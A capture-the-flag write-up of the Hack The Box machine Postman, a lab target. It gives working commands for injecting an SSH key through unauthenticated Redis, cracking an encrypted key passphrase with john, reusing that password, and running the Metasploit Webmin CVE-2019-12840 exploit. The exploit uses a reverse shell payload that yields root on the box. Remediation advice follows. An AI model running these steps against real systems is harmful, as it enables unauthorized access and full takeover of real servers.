---
title: "HTB CPTS Track: Postman (easy)"
date: 2026-10-02
category: writeups
tags:
  - cpts-track
  - htb
  - linux
  - redis
  - ssh-key-injection
  - password-cracking
  - password-reuse
  - webmin
  - cve-2019-12840
  - metasploit
  - privilege-escalation
description: "Black-box Linux box: an unauthenticated Redis instance lets me write my own SSH key for a foothold, a backed-up encrypted private key cracks to a reused password for user, and Webmin 1.910 (CVE-2019-12840) running as root gives up a root shell."
keywords: redis-4.0.9, unauthenticated-redis, redis-cli, ssh-key-injection, config set dir, config set dbfilename, id_rsa.bak, ssh2john, john the ripper, rockyou, encrypted rsa private key, passphrase cracking, password-reuse, webmin 1.910, miniserv, cve-2019-12840, webmin package updates rce, metasploit, webmin_packageup_rce, reverse_perl, ssl option, apache 2.4.29, openssh 7.6p1
---
![[Postman1.png]]

Postman is a black-box Linux box, no credentials to start. It's rated easy, but the chain is a clean tour of four separate mistakes stacked on top of each other: a Redis instance exposed with no auth, a private key backed up where the wrong user can read it, a passphrase reused as a login password, and an outdated Webmin running as root. Each one is small. Together they walk you from an open port to `root.txt`.

1. Unauthenticated **Redis 4.0.9** on 6379, abuse `config set dir`/`dbfilename` to write my public key into the `redis` user's `authorized_keys`, then SSH in.
2. Find **`/opt/id_rsa.bak`**, an encrypted RSA private key that `redis` can read.
3. Crack the passphrase offline with **ssh2john + john** (`computer2008`), which doubles as **Matt's password**, and become Matt for user.
4. Matt's creds log into **Webmin 1.910** on port 10000, vulnerable to **CVE-2019-12840**. The module runs as root, so that's root.

> No assumed-breach creds here. Everything starts from the Nmap scan.

---

# Enumeration

## Nmap

```bash
sudo nmap -sV -sC -p- 10.129.2.1 -T5
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Four ports, and the two that matter aren't the web server. Port 80 is a personal website (not the way in here), and SSH is just SSH. The leads are:

- **Redis 4.0.9 on 6379.** A key-value store reachable straight off the network is loud. Redis in this era ships with no authentication, and it can be talked into writing files. That's the foothold.
- **MiniServ 1.910 (Webmin) on 10000.** Webmin 1.910 is old and has a known authenticated RCE. I can't use it yet (no creds), but I note it now, it's the root path.

---

# Initial Foothold: Unauthenticated Redis

> **Why this works:** Redis before 6.0 has no authentication on by default, and it will tell you where to write its own database file. `config set dir` picks the directory and `config set dbfilename` picks the filename of the next `save`, and that saved RDB file contains whatever keys you've set. Point `dir` at a user's `.ssh/`, name the file `authorized_keys`, store your public key as a value, and `save` drops your key exactly where `sshd` looks for it. The blank lines around the key matter: Redis wraps the value in binary RDB metadata, and padding with `\n\n` keeps your key isolated on its own clean line so SSH still parses it.

Following the Redis key-injection path from [HackTricks](https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html), I generate a throwaway keypair and pad the public key with newlines:

```bash
ssh-keygen -t rsa -f redis_key -N ""
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > spaced_key.txt
```

Then load the padded key into Redis, repoint the database at the `redis` user's `.ssh/`, name it `authorized_keys`, and `save` to flush it to disk:

```bash
redis-cli -h 10.129.2.1 -x set crackit < spaced_key.txt
redis-cli -h 10.129.2.1 config set dir /var/lib/redis/.ssh
redis-cli -h 10.129.2.1 config set dbfilename "authorized_keys"
redis-cli -h 10.129.2.1 save
```

Every command comes back `OK`, which means `/var/lib/redis/.ssh/authorized_keys` now contains my public key. SSH in as `redis` with the matching private key:

```bash
ssh -i redis_key redis@10.129.2.1
```

```
Last login: Fri Oct  2 21:11:47 2026 from 10.10.14.137
redis@Postman:~$ whoami
redis
```

Shell as `redis` on `Postman`.

---

# Recon: Finding the Backup Key

First, who else is on the box. Trimming `/etc/passwd` to the accounts with real shells:

```
root:x:0:0:root:/root:/bin/bash
...
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```

`Matt` (uid 1000) is the human user and the obvious next target. Poking around, `/opt` has something that shouldn't be there:

```bash
redis@Postman:/opt$ cat id_rsa.bak
```

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
... (trimmed) ...
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

`Proc-Type: 4,ENCRYPTED` is the detail. This is a private key, readable by `redis`, but it's locked behind a passphrase, so I can't use it as-is. A backup key (`id_rsa.bak`) sitting in `/opt` is the mistake. Now I just need the passphrase.

---

# User: Crack the Passphrase, Reuse It

I pulled the key down to my box (saved it as `id`) and let John work on it offline:

```bash
ssh2john id > rsa
john rsa --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```

```
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
computer2008     (id)
1g 0:00:00:28 DONE (2026-10-02 22:34) ...
```

Passphrase: **`computer2008`**.

> **Why this works:** an encrypted SSH private key carries its own verifier, so John can test passphrases against it entirely offline, no network, no lockout, as fast as the CPU goes. `ssh2john` just reshapes the key into a hash format John understands. A passphrase is then only as strong as its absence from the wordlist, and `computer2008` is sitting in rockyou.

Here's where the box rewards you for one crack twice. `computer2008` isn't only the key's passphrase, it's also Matt's account password (the same value logs into Webmin as Matt in the next section), so becoming Matt is a straight `su` with the password I just recovered. My notes pick back up at Matt's shell with the flag in his home:

```
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ cat user.txt
<FLAG>
```

**user.txt captured.**

> **Why this works (password reuse):** there was no technical reason for a backup key's passphrase to match a system login, but people reuse secrets across boundaries all the time. Any secret you crack is worth trying everywhere else before you reach for anything harder, it's often the shortest path to the next account.

---

# Root: Webmin 1.910 (CVE-2019-12840)

Matt can reach the Webmin panel on port 10000, and Webmin's whole reason for existing is running system tasks with high privilege. Before trusting that, I check what the service actually runs as:

```
Matt@Postman:~$ ps aux | grep mini
root        768  0.0  3.1  95296 29268 ?        Ss   20:44   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

`miniserv.pl` runs as **root**. So any authenticated command execution in Webmin isn't a privesc, it's root directly. Webmin 1.910 has exactly that: [CVE-2019-12840](https://nvd.nist.gov/vuln/detail/CVE-2019-12840), an authenticated command injection in the Package Updates module, with a ready Metasploit module.

> **Why this works:** the Package Updates module builds a shell command out of user-supplied input without sanitizing it, so any authenticated user who can reach that module gets command execution. Because `miniserv.pl` runs as root, that execution is as root. Matt's reused password is the only authorization the exploit needs.

Find and load the module:

```
msfconsole -q
msf >> search Webmin 1.910

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_packageup_rce  2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution

msf >> use 0
[*] Using configured payload cmd/unix/reverse_perl
```

Set Matt's creds, the target, and my listener (`RPORT` stays 10000):

```
set USERNAME Matt
set PASSWORD computer2008
set RHOSTS 10.129.2.1
set LHOST tun0
```

First run fails, and the error is misleading:

```
msf exploit(webmin_packageup_rce) >> run
[*] Started reverse TCP handler on 10.10.14.137:4444
[-] Exploit failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
[*] Exploit completed, but no session was created.
```

That `ENOTCONN` reads like a network problem, but it's really the module speaking plaintext HTTP at a TLS port. Webmin on 10000 is HTTPS, and the module defaults to `SSL false`. Flip it and rerun:

```
msf exploit(webmin_packageup_rce) >> set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf exploit(webmin_packageup_rce) >> run
[*] Started reverse TCP handler on 10.10.14.137:4444
[+] Session cookie: 187fa1b36c28ab5e048701da5d2eeccd
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.137:4444 -> 10.129.2.1:38816) at 2026-10-02 22:48:07 +0200

whoami
root
cat /root/root.txt
<FLAG>
```

**root.txt captured. Box owned.**

---

# Remediation

- **Lock down Redis.** Require authentication (`requirepass` or ACLs), keep `protected-mode` on, and bind it to `127.0.0.1` so it isn't reachable off-host. An unauthenticated Redis that can write files is a foothold waiting to happen.
- **Don't back up private keys into readable locations.** `id_rsa.bak` in `/opt`, readable by the `redis` service account, is what bridged Redis to a real user. Keys belong in the owner's `~/.ssh` with tight permissions, not a world-adjacent backup, and this one should be rotated, it's burned.
- **Don't reuse a key passphrase as a password.** `computer2008` covered the key, the Matt account, and Webmin. Separate secrets would have broken the chain at user.
- **Patch Webmin.** 1.910 is vulnerable to CVE-2019-12840. Update it, restrict who can reach port 10000, and limit which users have the Package Updates module, since any of them get root through it.

---

References:
- [HackTricks , 6379 Redis pentesting](https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)
- [CVE-2019-12840 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2019-12840) , Webmin Package Updates RCE
- [Webmin 1.910 Package Updates RCE advisory (pentest.com.tr)](https://www.pentest.com.tr/exploits/Webmin-1910-Package-Updates-Remote-Command-Execution.html)
